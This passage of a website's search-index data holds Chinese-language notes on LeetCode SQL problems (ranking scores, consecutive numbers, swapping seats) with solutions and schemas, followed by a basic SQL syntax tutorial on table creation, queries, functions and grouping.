RETURN ( SELECT ( SELECT DISTINCT Salary FROM Employee ORDER BY Salary DESC LIMIT N, 1 ) ); END`},{header:"SQL Schema",slug:"sql-schema-11",content:"\u540C 176\u3002"},{header:"178. Rank Scores",slug:"_178-rank-scores",content:"https://leetcode.com/problems/rank-scores/description/"},{header:"Description",slug:"description-12",content:`\u5F97\u5206\u8868\uFF1A
+----+-------+
| Id | Score |
+----+-------+
| 1 | 3.50 |
| 2 | 3.65 |
| 3 | 4.00 |
| 4 | 3.85 |
| 5 | 4.00 |
| 6 | 3.65 |
+----+-------+
\u5C06\u5F97\u5206\u6392\u5E8F\uFF0C\u5E76\u7EDF\u8BA1\u6392\u540D\u3002
+-------+------+
| Score | Rank |
+-------+------+
| 4.00 | 1 |
| 4.00 | 1 |
| 3.85 | 2 |
| 3.65 | 3 |
| 3.65 | 3 |
| 3.50 | 4 |
+-------+------+`},{header:"Solution",slug:"solution-12",content:`\u8981\u7EDF\u8BA1\u67D0\u4E2A score \u7684\u6392\u540D\uFF0C\u53EA\u8981\u7EDF\u8BA1\u5927\u4E8E\u7B49\u4E8E\u8BE5 score \u7684 score \u6570\u91CF\u3002 Id
score
\u5927\u4E8E\u7B49\u4E8E\u8BE5 score \u7684 score \u6570\u91CF
\u6392\u540D 1
4.1
3
3 2
4.2
2
2 3
4.3
1
1 \u4F7F\u7528\u8FDE\u63A5\u64CD\u4F5C\u627E\u5230\u67D0\u4E2A score \u5BF9\u5E94\u7684\u5927\u4E8E\u7B49\u4E8E\u5176\u503C\u7684\u8BB0\u5F55\uFF1A
SELECT *
FROM Scores S1 INNER JOIN Scores S2 ON S1.score <= S2.score
ORDER BY S1.score DESC, S1.Id; S1.Id
S1.score
S2.Id
S2.score 3
4.3
3
4.3 2
4.2
2
4.2 2
4.2
3
4.3 1
4.1
1
4.1 1
4.1
2
4.2 1
4.1
3
4.3 \u53EF\u4EE5\u770B\u5230\u6BCF\u4E2A S1.score \u90FD\u6709\u5BF9\u5E94\u597D\u51E0\u6761\u8BB0\u5F55\uFF0C\u6211\u4EEC\u518D\u8FDB\u884C\u5206\u7EC4\uFF0C\u5E76\u7EDF\u8BA1\u6BCF\u4E2A\u5206\u7EC4\u7684\u6570\u91CF\u4F5C\u4E3A 'Rank'
SELECT S1.score 'Score', COUNT(*) 'Rank'
FROM Scores S1 INNER JOIN Scores S2 ON S1.score <= S2.score
GROUP BY S1.id, S1.score
ORDER BY S1.score DESC, S1.Id; score
Rank 4.3
1 4.2
2 4.1
3 \u4E0A\u9762\u7684\u89E3\u6CD5\u770B\u4F3C\u6CA1\u95EE\u9898\uFF0C\u4F46\u662F\u5BF9\u4E8E\u4EE5\u4E0B\u6570\u636E\uFF0C\u5B83\u5374\u5F97\u5230\u4E86\u9519\u8BEF\u7684\u7ED3\u679C\uFF1A Id
score 1
4.1 2
4.2 3
4.2 score
Rank 4.2
2 4.2
2 4.1
3 \u800C\u6211\u4EEC\u5E0C\u671B\u7684\u7ED3\u679C\u4E3A\uFF1A score
Rank 4.2
1 4.2
1 4.1
2 \u8FDE\u63A5\u60C5\u51B5\u5982\u4E0B\uFF1A S1.Id
S1.score
S2.Id
S2.score 2
4.2
3
4.2 2
4.2
2
4.2 3
4.2
3
4.2 3
4.2
2
4.1 1
4.1
3
4.2 1
4.1
2
4.2 1
4.1
1
4.1 \u6211\u4EEC\u60F3\u8981\u7684\u7ED3\u679C\u662F\uFF0C\u628A\u5206\u6570\u76F8\u540C\u7684\u653E\u5728\u540C\u4E00\u4E2A\u6392\u540D\uFF0C\u5E76\u4E14\u76F8\u540C\u5206\u6570\u53EA\u5360\u4E00\u4E2A\u4F4D\u7F6E\uFF0C\u4F8B\u5982\u4E0A\u9762\u7684\u5206\u6570\uFF0CId=2 \u548C Id=3 \u7684\u8BB0\u5F55\u90FD\u6709\u76F8\u540C\u7684\u5206\u6570\uFF0C\u5E76\u4E14\u6700\u9AD8\uFF0C\u4ED6\u4EEC\u5E76\u5217\u7B2C\u4E00\u3002\u800C Id=1 \u7684\u8BB0\u5F55\u5E94\u8BE5\u6392\u7B2C\u4E8C\u540D\uFF0C\u800C\u4E0D\u662F\u7B2C\u4E09\u540D\u3002\u6240\u4EE5\u5728\u8FDB\u884C COUNT \u8BA1\u6570\u7EDF\u8BA1\u65F6\uFF0C\u6211\u4EEC\u9700\u8981\u4F7F\u7528 COUNT( DISTINCT S2.score ) \u4ECE\u800C\u53EA\u7EDF\u8BA1\u4E00\u6B21\u76F8\u540C\u7684\u5206\u6570\u3002
SELECT S1.score 'Score', COUNT( DISTINCT S2.score ) 'Rank'
FROM Scores S1 INNER JOIN Scores S2 ON S1.score <= S2.score
GROUP BY S1.id, S1.score
ORDER BY S1.score DESC;`},{header:"SQL Schema",slug:"sql-schema-12",content:`DROP TABLE
IF EXISTS Scores;
CREATE TABLE Scores ( Id INT, Score DECIMAL ( 3, 2 ) );
INSERT INTO Scores ( Id, Score )
VALUES ( 1, 4.1 ), ( 2, 4.1 ), ( 3, 4.2 ), ( 4, 4.2 ), ( 5, 4.3 ), ( 6, 4.3 );`},{header:"180. Consecutive Numbers",slug:"_180-consecutive-numbers",content:"https://leetcode.com/problems/consecutive-numbers/description/"},{header:"Description",slug:"description-13",content:`\u6570\u5B57\u8868\uFF1A
+----+-----+
| Id | Num |
+----+-----+
| 1 | 1 |
| 2 | 1 |
| 3 | 1 |
| 4 | 2 |
| 5 | 1 |
| 6 | 2 |
| 7 | 2 |
+----+-----+
\u67E5\u627E\u8FDE\u7EED\u51FA\u73B0\u4E09\u6B21\u7684\u6570\u5B57\u3002
+-----------------+
| ConsecutiveNums |
+-----------------+
| 1 |
+-----------------+`},{header:"Solution",slug:"solution-13",content:`SELECT DISTINCT L1.num ConsecutiveNums
FROM Logs L1, Logs L2, Logs L3
WHERE L1.id = l2.id - 1 AND L2.id = L3.id - 1 AND L1.num = L2.num AND l2.num = l3.num;`},{header:"SQL Schema",slug:"sql-schema-13",content:`DROP TABLE
IF EXISTS LOGS;
CREATE TABLE LOGS ( Id INT, Num INT );
INSERT INTO LOGS ( Id, Num )
VALUES ( 1, 1 ), ( 2, 1 ), ( 3, 1 ), ( 4, 2 ), ( 5, 1 ), ( 6, 2 ), ( 7, 2 );`},{header:"626. Exchange Seats",slug:"_626-exchange-seats",content:"https://leetcode.com/problems/exchange-seats/description/"},{header:"Description",slug:"description-14",content:`seat \u8868\u5B58\u50A8\u7740\u5EA7\u4F4D\u5BF9\u5E94\u7684\u5B66\u751F\u3002
+---------+---------+
| id | student |
+---------+---------+
| 1 | Abbot |
| 2 | Doris |
| 3 | Emerson |
| 4 | Green |
| 5 | Jeames |
+---------+---------+
\u8981\u6C42\u4EA4\u6362\u76F8\u90BB\u5EA7\u4F4D\u7684\u4E24\u4E2A\u5B66\u751F\uFF0C\u5982\u679C\u6700\u540E\u4E00\u4E2A\u5EA7\u4F4D\u662F\u5947\u6570\uFF0C\u90A3\u4E48\u4E0D\u4EA4\u6362\u8FD9\u4E2A\u5EA7\u4F4D\u4E0A\u7684\u5B66\u751F\u3002
+---------+---------+
| id | student |
+---------+---------+
| 1 | Doris |
| 2 | Abbot |
| 3 | Green |
| 4 | Emerson |
| 5 | Jeames |
+---------+---------+`},{header:"Solution",slug:"solution-14",content:`\u4F7F\u7528\u591A\u4E2A union\u3002
## \u5904\u7406\u5076\u6570 id\uFF0C\u8BA9 id \u51CF 1
## \u4F8B\u5982 2,4,6,... \u53D8\u6210 1,3,5,...
SELECT s1.id - 1 AS id, s1.student
FROM seat s1
WHERE s1.id MOD 2 = 0 UNION
## \u5904\u7406\u5947\u6570 id\uFF0C\u8BA9 id \u52A0 1\u3002\u4F46\u662F\u5982\u679C\u6700\u5927\u7684 id \u4E3A\u5947\u6570\uFF0C\u5219\u4E0D\u505A\u5904\u7406
## \u4F8B\u5982 1,3,5,... \u53D8\u6210 2,4,6,...
SELECT s2.id + 1 AS id, s2.student
FROM seat s2
WHERE s2.id MOD 2 = 1 AND s2.id != ( SELECT max( s3.id ) FROM seat s3 ) UNION
## \u5982\u679C\u6700\u5927\u7684 id \u4E3A\u5947\u6570\uFF0C\u5355\u72EC\u53D6\u51FA\u8FD9\u4E2A\u6570
SELECT s4.id AS id, s4.student
FROM seat s4
WHERE s4.id MOD 2 = 1 AND s4.id = ( SELECT max( s5.id ) FROM seat s5 )
ORDER BY id;`},{header:"SQL Schema",slug:"sql-schema-14",content:`DROP TABLE
IF EXISTS seat;
CREATE TABLE seat ( id INT, student VARCHAR ( 255 ) );
INSERT INTO seat ( id, student )
VALUES ( '1', 'Abbot' ), ( '2', 'Doris' ), ( '3', 'Emerson' ), ( '4', 'Green' ), ( '5', 'Jeames' );`}]},{path:"/java/SQL%20%E8%AF%AD%E6%B3%95.html",title:"SQL \u8BED\u6CD5",pathLocale:"/",contents:[{header:"SQL \u8BED\u6CD5",slug:"sql-\u8BED\u6CD5",content:`SQL \u8BED\u6CD5 \u4E00\u3001\u57FA\u7840
\u4E8C\u3001\u521B\u5EFA\u8868
\u4E09\u3001\u4FEE\u6539\u8868
\u56DB\u3001\u63D2\u5165
\u4E94\u3001\u66F4\u65B0
\u516D\u3001\u5220\u9664
\u4E03\u3001\u67E5\u8BE2 DISTINCT
LIMIT \u516B\u3001\u6392\u5E8F
\u4E5D\u3001\u8FC7\u6EE4
\u5341\u3001\u901A\u914D\u7B26
\u5341\u4E00\u3001\u8BA1\u7B97\u5B57\u6BB5
\u5341\u4E8C\u3001\u51FD\u6570 \u6C47\u603B
\u6587\u672C\u5904\u7406
\u65E5\u671F\u548C\u65F6\u95F4\u5904\u7406
\u6570\u503C\u5904\u7406 \u5341\u4E09\u3001\u5206\u7EC4
\u5341\u56DB\u3001\u5B50\u67E5\u8BE2
\u5341\u4E94\u3001\u8FDE\u63A5 \u5185\u8FDE\u63A5
\u81EA\u8FDE\u63A5
\u81EA\u7136\u8FDE\u63A5
\u5916\u8FDE\u63A5 \u5341\u516D\u3001\u7EC4\u5408\u67E5\u8BE2
\u5341\u4E03\u3001\u89C6\u56FE
\u5341\u516B\u3001\u5B58\u50A8\u8FC7\u7A0B
\u5341\u4E5D\u3001\u6E38\u6807
\u4E8C\u5341\u3001\u89E6\u53D1\u5668
\u4E8C\u5341\u4E00\u3001\u4E8B\u52A1\u7BA1\u7406
\u4E8C\u5341\u4E8C\u3001\u5B57\u7B26\u96C6
\u4E8C\u5341\u4E09\u3001\u6743\u9650\u7BA1\u7406
\u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u57FA\u7840",slug:"\u4E00\u3001\u57FA\u7840",content:`\u6A21\u5F0F\u5B9A\u4E49\u4E86\u6570\u636E\u5982\u4F55\u5B58\u50A8\u3001\u5B58\u50A8\u4EC0\u4E48\u6837\u7684\u6570\u636E\u4EE5\u53CA\u6570\u636E\u5982\u4F55\u5206\u89E3\u7B49\u4FE1\u606F\uFF0C\u6570\u636E\u5E93\u548C\u8868\u90FD\u6709\u6A21\u5F0F\u3002
\u4E3B\u952E\u7684\u503C\u4E0D\u5141\u8BB8\u4FEE\u6539\uFF0C\u4E5F\u4E0D\u5141\u8BB8\u590D\u7528\uFF08\u4E0D\u80FD\u5C06\u5DF2\u7ECF\u5220\u9664\u7684\u4E3B\u952E\u503C\u8D4B\u7ED9\u65B0\u6570\u636E\u884C\u7684\u4E3B\u952E\uFF09\u3002
SQL\uFF08Structured Query Language)\uFF0C\u6807\u51C6 SQL \u7531 ANSI \u6807\u51C6\u59D4\u5458\u4F1A\u7BA1\u7406\uFF0C\u4ECE\u800C\u79F0\u4E3A ANSI SQL\u3002\u5404\u4E2A DBMS \u90FD\u6709\u81EA\u5DF1\u7684\u5B9E\u73B0\uFF0C\u5982 PL/SQL\u3001Transact-SQL \u7B49\u3002
SQL \u8BED\u53E5\u4E0D\u533A\u5206\u5927\u5C0F\u5199\uFF0C\u4F46\u662F\u6570\u636E\u5E93\u8868\u540D\u3001\u5217\u540D\u548C\u503C\u662F\u5426\u533A\u5206\u4F9D\u8D56\u4E8E\u5177\u4F53\u7684 DBMS \u4EE5\u53CA\u914D\u7F6E\u3002
SQL \u652F\u6301\u4EE5\u4E0B\u4E09\u79CD\u6CE8\u91CA\uFF1A
## \u6CE8\u91CA
SELECT *
FROM mytable; -- \u6CE8\u91CA
/* \u6CE8\u91CA1 \u6CE8\u91CA2 */
\u6570\u636E\u5E93\u521B\u5EFA\u4E0E\u4F7F\u7528\uFF1A
CREATE DATABASE test;
USE test;`},{header:"\u4E8C\u3001\u521B\u5EFA\u8868",slug:"\u4E8C\u3001\u521B\u5EFA\u8868",content:"CREATE TABLE mytable ( # int \u7C7B\u578B\uFF0C\u4E0D\u4E3A\u7A7A\uFF0C\u81EA\u589E id INT NOT NULL AUTO_INCREMENT, # int \u7C7B\u578B\uFF0C\u4E0D\u53EF\u4E3A\u7A7A\uFF0C\u9ED8\u8BA4\u503C\u4E3A 1\uFF0C\u4E0D\u4E3A\u7A7A col1 INT NOT NULL DEFAULT 1, # \u53D8\u957F\u5B57\u7B26\u4E32\u7C7B\u578B\uFF0C\u6700\u957F\u4E3A 45 \u4E2A\u5B57\u7B26\uFF0C\u53EF\u4EE5\u4E3A\u7A7A col2 VARCHAR(45) NULL, # \u65E5\u671F\u7C7B\u578B\uFF0C\u53EF\u4E3A\u7A7A col3 DATE NULL, # \u8BBE\u7F6E\u4E3B\u952E\u4E3A id PRIMARY KEY (`id`));"},{header:"\u4E09\u3001\u4FEE\u6539\u8868",slug:"\u4E09\u3001\u4FEE\u6539\u8868",content:`\u6DFB\u52A0\u5217
ALTER TABLE mytable
ADD col CHAR(20);
\u5220\u9664\u5217
ALTER TABLE mytable
DROP COLUMN col;
\u5220\u9664\u8868
DROP TABLE mytable;`},{header:"\u56DB\u3001\u63D2\u5165",slug:"\u56DB\u3001\u63D2\u5165",content:`\u666E\u901A\u63D2\u5165
INSERT INTO mytable(col1, col2)
VALUES(val1, val2);
\u63D2\u5165\u68C0\u7D22\u51FA\u6765\u7684\u6570\u636E
INSERT INTO mytable1(col1, col2)
SELECT col1, col2
FROM mytable2;
\u5C06\u4E00\u4E2A\u8868\u7684\u5185\u5BB9\u63D2\u5165\u5230\u4E00\u4E2A\u65B0\u8868
CREATE TABLE newtable AS
SELECT * FROM mytable;`},{header:"\u4E94\u3001\u66F4\u65B0",slug:"\u4E94\u3001\u66F4\u65B0",content:`UPDATE mytable
SET col = val
WHERE id = 1;`},{header:"\u516D\u3001\u5220\u9664",slug:"\u516D\u3001\u5220\u9664",content:`DELETE FROM mytable
WHERE id = 1;
TRUNCATE TABLE \u53EF\u4EE5\u6E05\u7A7A\u8868\uFF0C\u4E5F\u5C31\u662F\u5220\u9664\u6240\u6709\u884C\u3002
TRUNCATE TABLE mytable;
\u4F7F\u7528\u66F4\u65B0\u548C\u5220\u9664\u64CD\u4F5C\u65F6\u4E00\u5B9A\u8981\u7528 WHERE \u5B50\u53E5\uFF0C\u4E0D\u7136\u4F1A\u628A\u6574\u5F20\u8868\u7684\u6570\u636E\u90FD\u7834\u574F\u3002\u53EF\u4EE5\u5148\u7528 SELECT \u8BED\u53E5\u8FDB\u884C\u6D4B\u8BD5\uFF0C\u9632\u6B62\u9519\u8BEF\u5220\u9664\u3002`},{header:"\u4E03\u3001\u67E5\u8BE2",slug:"\u4E03\u3001\u67E5\u8BE2",content:""},{header:"DISTINCT",slug:"distinct",content:`\u76F8\u540C\u503C\u53EA\u4F1A\u51FA\u73B0\u4E00\u6B21\u3002\u5B83\u4F5C\u7528\u4E8E\u6240\u6709\u5217\uFF0C\u4E5F\u5C31\u662F\u8BF4\u6240\u6709\u5217\u7684\u503C\u90FD\u76F8\u540C\u624D\u7B97\u76F8\u540C\u3002
SELECT DISTINCT col1, col2
FROM mytable;`},{header:"LIMIT",slug:"limit",content:`\u9650\u5236\u8FD4\u56DE\u7684\u884C\u6570\u3002\u53EF\u4EE5\u6709\u4E24\u4E2A\u53C2\u6570\uFF0C\u7B2C\u4E00\u4E2A\u53C2\u6570\u4E3A\u8D77\u59CB\u884C\uFF0C\u4ECE 0 \u5F00\u59CB\uFF1B\u7B2C\u4E8C\u4E2A\u53C2\u6570\u4E3A\u8FD4\u56DE\u7684\u603B\u884C\u6570\u3002
\u8FD4\u56DE\u524D 5 \u884C\uFF1A
SELECT *
FROM mytable
LIMIT 5;
SELECT *
FROM mytable
LIMIT 0, 5;
\u8FD4\u56DE\u7B2C 3 ~ 5 \u884C\uFF1A
SELECT *
FROM mytable
LIMIT 2, 3;`},{header:"\u516B\u3001\u6392\u5E8F",slug:"\u516B\u3001\u6392\u5E8F",content:`ASC \uFF1A\u5347\u5E8F\uFF08\u9ED8\u8BA4\uFF09
DESC \uFF1A\u964D\u5E8F \u53EF\u4EE5\u6309\u591A\u4E2A\u5217\u8FDB\u884C\u6392\u5E8F\uFF0C\u5E76\u4E14\u4E3A\u6BCF\u4E2A\u5217\u6307\u5B9A\u4E0D\u540C\u7684\u6392\u5E8F\u65B9\u5F0F\uFF1A
SELECT *
FROM mytable
ORDER BY col1 DESC, col2 ASC;`},{header:"\u4E5D\u3001\u8FC7\u6EE4",slug:"\u4E5D\u3001\u8FC7\u6EE4",content:`\u4E0D\u8FDB\u884C\u8FC7\u6EE4\u7684\u6570\u636E\u975E\u5E38\u5927\uFF0C\u5BFC\u81F4\u901A\u8FC7\u7F51\u7EDC\u4F20\u8F93\u4E86\u591A\u4F59\u7684\u6570\u636E\uFF0C\u4ECE\u800C\u6D6A\u8D39\u4E86\u7F51\u7EDC\u5E26\u5BBD\u3002\u56E0\u6B64\u5C3D\u91CF\u4F7F\u7528 SQL \u8BED\u53E5\u6765\u8FC7\u6EE4\u4E0D\u5FC5\u8981\u7684\u6570\u636E\uFF0C\u800C\u4E0D\u662F\u4F20\u8F93\u6240\u6709\u7684\u6570\u636E\u5230\u5BA2\u6237\u7AEF\u4E2D\u7136\u540E\u7531\u5BA2\u6237\u7AEF\u8FDB\u884C\u8FC7\u6EE4\u3002
SELECT *
FROM mytable
WHERE col IS NULL;
\u4E0B\u8868\u663E\u793A\u4E86 WHERE \u5B50\u53E5\u53EF\u7528\u7684\u64CD\u4F5C\u7B26 \u64CD\u4F5C\u7B26
\u8BF4\u660E =
\u7B49\u4E8E <
\u5C0F\u4E8E >
\u5927\u4E8E <> !=
\u4E0D\u7B49\u4E8E <= !>
\u5C0F\u4E8E\u7B49\u4E8E >= !<
\u5927\u4E8E\u7B49\u4E8E BETWEEN
\u5728\u4E24\u4E2A\u503C\u4E4B\u95F4 IS NULL
\u4E3A NULL \u503C \u5E94\u8BE5\u6CE8\u610F\u5230\uFF0CNULL \u4E0E 0\u3001\u7A7A\u5B57\u7B26\u4E32\u90FD\u4E0D\u540C\u3002
AND \u548C OR \u7528\u4E8E\u8FDE\u63A5\u591A\u4E2A\u8FC7\u6EE4\u6761\u4EF6\u3002\u4F18\u5148\u5904\u7406 AND\uFF0C\u5F53\u4E00\u4E2A\u8FC7\u6EE4\u8868\u8FBE\u5F0F\u6D89\u53CA\u5230\u591A\u4E2A AND \u548C OR \u65F6\uFF0C\u53EF\u4EE5\u4F7F\u7528 () \u6765\u51B3\u5B9A\u4F18\u5148\u7EA7\uFF0C\u4F7F\u5F97\u4F18\u5148\u7EA7\u5173\u7CFB\u66F4\u6E05\u6670\u3002
IN \u64CD\u4F5C\u7B26\u7528\u4E8E\u5339\u914D\u4E00\u7EC4\u503C\uFF0C\u5176\u540E\u4E5F\u53EF\u4EE5\u63A5\u4E00\u4E2A SELECT \u5B50\u53E5\uFF0C\u4ECE\u800C\u5339\u914D\u5B50\u67E5\u8BE2\u5F97\u5230\u7684\u4E00\u7EC4\u503C\u3002
NOT \u64CD\u4F5C\u7B26\u7528\u4E8E\u5426\u5B9A\u4E00\u4E2A\u6761\u4EF6\u3002`},{header:"\u5341\u3001\u901A\u914D\u7B26",slug:"\u5341\u3001\u901A\u914D\u7B26",content:`\u901A\u914D\u7B26\u4E5F\u662F\u7528\u5728\u8FC7\u6EE4\u8BED\u53E5\u4E2D\uFF0C\u4F46\u5B83\u53EA\u80FD\u7528\u4E8E\u6587\u672C\u5B57\u6BB5\u3002 % \u5339\u914D >=0 \u4E2A\u4EFB\u610F\u5B57\u7B26\uFF1B _ \u5339\u914D ==1 \u4E2A\u4EFB\u610F\u5B57\u7B26\uFF1B [ ] \u53EF\u4EE5\u5339\u914D\u96C6\u5408\u5185\u7684\u5B57\u7B26\uFF0C\u4F8B\u5982 [ab] \u5C06\u5339\u914D\u5B57\u7B26 a \u6216\u8005 b\u3002\u7528\u8131\u5B57\u7B26 ^ \u53EF\u4EE5\u5BF9\u5176\u8FDB\u884C\u5426\u5B9A\uFF0C\u4E5F\u5C31\u662F\u4E0D\u5339\u914D\u96C6\u5408\u5185\u7684\u5B57\u7B26\u3002 \u4F7F\u7528 Like \u6765\u8FDB\u884C\u901A\u914D\u7B26\u5339\u914D\u3002
SELECT *
FROM mytable
WHERE col LIKE '[^AB]%'; -- \u4E0D\u4EE5 A \u548C B \u5F00\u5934\u7684\u4EFB\u610F\u6587\u672C
\u4E0D\u8981\u6EE5\u7528\u901A\u914D\u7B26\uFF0C\u901A\u914D\u7B26\u4F4D\u4E8E\u5F00\u5934\u5904\u5339\u914D\u4F1A\u975E\u5E38\u6162\u3002`},{header:"\u5341\u4E00\u3001\u8BA1\u7B97\u5B57\u6BB5",slug:"\u5341\u4E00\u3001\u8BA1\u7B97\u5B57\u6BB5",content:`\u5728\u6570\u636E\u5E93\u670D\u52A1\u5668\u4E0A\u5B8C\u6210\u6570\u636E\u7684\u8F6C\u6362\u548C\u683C\u5F0F\u5316\u7684\u5DE5\u4F5C\u5F80\u5F80\u6BD4\u5BA2\u6237\u7AEF\u4E0A\u5FEB\u5F97\u591A\uFF0C\u5E76\u4E14\u8F6C\u6362\u548C\u683C\u5F0F\u5316\u540E\u7684\u6570\u636E\u91CF\u66F4\u5C11\u7684\u8BDD\u53EF\u4EE5\u51CF\u5C11\u7F51\u7EDC\u901A\u4FE1\u91CF\u3002
\u8BA1\u7B97\u5B57\u6BB5\u901A\u5E38\u9700\u8981\u4F7F\u7528 AS \u6765\u53D6\u522B\u540D\uFF0C\u5426\u5219\u8F93\u51FA\u7684\u65F6\u5019\u5B57\u6BB5\u540D\u4E3A\u8BA1\u7B97\u8868\u8FBE\u5F0F\u3002
SELECT col1 * col2 AS alias
FROM mytable;
CONCAT() \u7528\u4E8E\u8FDE\u63A5\u4E24\u4E2A\u5B57\u6BB5\u3002\u8BB8\u591A\u6570\u636E\u5E93\u4F1A\u4F7F\u7528\u7A7A\u683C\u628A\u4E00\u4E2A\u503C\u586B\u5145\u4E3A\u5217\u5BBD\uFF0C\u56E0\u6B64\u8FDE\u63A5\u7684\u7ED3\u679C\u4F1A\u51FA\u73B0\u4E00\u4E9B\u4E0D\u5FC5\u8981\u7684\u7A7A\u683C\uFF0C\u4F7F\u7528 TRIM() \u53EF\u4EE5\u53BB\u9664\u9996\u5C3E\u7A7A\u683C\u3002
SELECT CONCAT(TRIM(col1), '(', TRIM(col2), ')') AS concat_col
FROM mytable;`},{header:"\u5341\u4E8C\u3001\u51FD\u6570",slug:"\u5341\u4E8C\u3001\u51FD\u6570",content:"\u5404\u4E2A DBMS \u7684\u51FD\u6570\u90FD\u662F\u4E0D\u76F8\u540C\u7684\uFF0C\u56E0\u6B64\u4E0D\u53EF\u79FB\u690D\uFF0C\u4EE5\u4E0B\u4E3B\u8981\u662F MySQL \u7684\u51FD\u6570\u3002"},{header:"\u6C47\u603B",slug:"\u6C47\u603B",content:`\u51FD \u6570
\u8BF4 \u660E AVG()
\u8FD4\u56DE\u67D0\u5217\u7684\u5E73\u5747\u503C COUNT()
\u8FD4\u56DE\u67D0\u5217\u7684\u884C\u6570 MAX()
\u8FD4\u56DE\u67D0\u5217\u7684\u6700\u5927\u503C MIN()
\u8FD4\u56DE\u67D0\u5217\u7684\u6700\u5C0F\u503C SUM()
\u8FD4\u56DE\u67D0\u5217\u503C\u4E4B\u548C AVG() \u4F1A\u5FFD\u7565 NULL \u884C\u3002
\u4F7F\u7528 DISTINCT \u53EF\u4EE5\u6C47\u603B\u4E0D\u540C\u7684\u503C\u3002
SELECT AVG(DISTINCT col1) AS avg_col
FROM mytable;`},{header:"\u6587\u672C\u5904\u7406",slug:"\u6587\u672C\u5904\u7406",content:`\u51FD\u6570
\u8BF4\u660E LEFT()
\u5DE6\u8FB9\u7684\u5B57\u7B26 RIGHT()
\u53F3\u8FB9\u7684\u5B57\u7B26 LOWER()
\u8F6C\u6362\u4E3A\u5C0F\u5199\u5B57\u7B26 UPPER()
\u8F6C\u6362\u4E3A\u5927\u5199\u5B57\u7B26 LTRIM()
\u53BB\u9664\u5DE6\u8FB9\u7684\u7A7A\u683C RTRIM()
\u53BB\u9664\u53F3\u8FB9\u7684\u7A7A\u683C LENGTH()
\u957F\u5EA6 SOUNDEX()
\u8F6C\u6362\u4E3A\u8BED\u97F3\u503C \u5176\u4E2D\uFF0C SOUNDEX() \u53EF\u4EE5\u5C06\u4E00\u4E2A\u5B57\u7B26\u4E32\u8F6C\u6362\u4E3A\u63CF\u8FF0\u5176\u8BED\u97F3\u8868\u793A\u7684\u5B57\u6BCD\u6570\u5B57\u6A21\u5F0F\u3002
SELECT *
FROM mytable
WHERE SOUNDEX(col1) = SOUNDEX('apple')`},{header:"\u65E5\u671F\u548C\u65F6\u95F4\u5904\u7406",slug:"\u65E5\u671F\u548C\u65F6\u95F4\u5904\u7406",content:`\u65E5\u671F\u683C\u5F0F\uFF1AYYYY-MM-DD
\u65F6\u95F4\u683C\u5F0F\uFF1AHH:<zero-width space>MM:SS \u51FD \u6570
\u8BF4 \u660E ADDDATE()
\u589E\u52A0\u4E00\u4E2A\u65E5\u671F\uFF08\u5929\u3001\u5468\u7B49\uFF09 ADDTIME()
\u589E\u52A0\u4E00\u4E2A\u65F6\u95F4\uFF08\u65F6\u3001\u5206\u7B49\uFF09 CURDATE()
\u8FD4\u56DE\u5F53\u524D\u65E5\u671F CURTIME()
\u8FD4\u56DE\u5F53\u524D\u65F6\u95F4 DATE()
\u8FD4\u56DE\u65E5\u671F\u65F6\u95F4\u7684\u65E5\u671F\u90E8\u5206 DATEDIFF()
\u8BA1\u7B97\u4E24\u4E2A\u65E5\u671F\u4E4B\u5DEE DATE_ADD()
\u9AD8\u5EA6\u7075\u6D3B\u7684\u65E5\u671F\u8FD0\u7B97\u51FD\u6570 DATE_FORMAT()
\u8FD4\u56DE\u4E00\u4E2A\u683C\u5F0F\u5316\u7684\u65E5\u671F\u6216\u65F6\u95F4\u4E32 DAY()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u7684\u5929\u6570\u90E8\u5206 DAYOFWEEK()
\u5BF9\u4E8E\u4E00\u4E2A\u65E5\u671F\uFF0C\u8FD4\u56DE\u5BF9\u5E94\u7684\u661F\u671F\u51E0 HOUR()
\u8FD4\u56DE\u4E00\u4E2A\u65F6\u95F4\u7684\u5C0F\u65F6\u90E8\u5206 MINUTE()
\u8FD4\u56DE\u4E00\u4E2A\u65F6\u95F4\u7684\u5206\u949F\u90E8\u5206 MONTH()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u7684\u6708\u4EFD\u90E8\u5206 NOW()
\u8FD4\u56DE\u5F53\u524D\u65E5\u671F\u548C\u65F6\u95F4 SECOND()
\u8FD4\u56DE\u4E00\u4E2A\u65F6\u95F4\u7684\u79D2\u90E8\u5206 TIME()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u65F6\u95F4\u7684\u65F6\u95F4\u90E8\u5206 YEAR()
\u8FD4\u56DE\u4E00\u4E2A\u65E5\u671F\u7684\u5E74\u4EFD\u90E8\u5206 mysql> SELECT NOW();
2018-4-14 20:25:11`},{header:"\u6570\u503C\u5904\u7406",slug:"\u6570\u503C\u5904\u7406",content:`\u51FD\u6570
\u8BF4\u660E SIN()
\u6B63\u5F26 COS()
\u4F59\u5F26 TAN()
\u6B63\u5207 ABS()
\u7EDD\u5BF9\u503C SQRT()
\u5E73\u65B9\u6839 MOD()
\u4F59\u6570 EXP()
\u6307\u6570 PI()
\u5706\u5468\u7387 RAND()
\u968F\u673A\u6570`},{header:"\u5341\u4E09\u3001\u5206\u7EC4",slug:"\u5341\u4E09\u3001\u5206\u7EC4",content:`\u628A\u5177\u6709\u76F8\u540C\u7684\u6570\u636E\u503C\u7684\u884C\u653E\u5728\u540C\u4E00\u7EC4\u4E2D\u3002
\u53EF\u4EE5\u5BF9\u540C\u4E00\u5206\u7EC4\u6570\u636E\u4F7F\u7528\u6C47\u603B\u51FD\u6570\u8FDB\u884C\u5904\u7406\uFF0C\u4F8B\u5982\u6C42\u5206\u7EC4\u6570\u636E\u7684\u5E73\u5747\u503C\u7B49\u3002
\u6307\u5B9A\u7684\u5206\u7EC4\u5B57\u6BB5\u9664\u4E86\u80FD\u6309\u8BE5\u5B57\u6BB5\u8FDB\u884C\u5206\u7EC4\uFF0C\u4E5F\u4F1A\u81EA\u52A8\u6309\u8BE5\u5B57\u6BB5\u8FDB\u884C\u6392\u5E8F\u3002
SELECT col, COUNT(*) AS num
FROM mytable
GROUP BY col;
GROUP BY \u81EA\u52A8\u6309\u5206\u7EC4\u5B57\u6BB5\u8FDB\u884C\u6392\u5E8F\uFF0CORDER BY \u4E5F\u53EF\u4EE5\u6309\u6C47\u603B\u5B57\u6BB5\u6765\u8FDB\u884C\u6392\u5E8F\u3002
SELECT col, COUNT(*) AS num
FROM mytable
GROUP BY col
ORDER BY num;
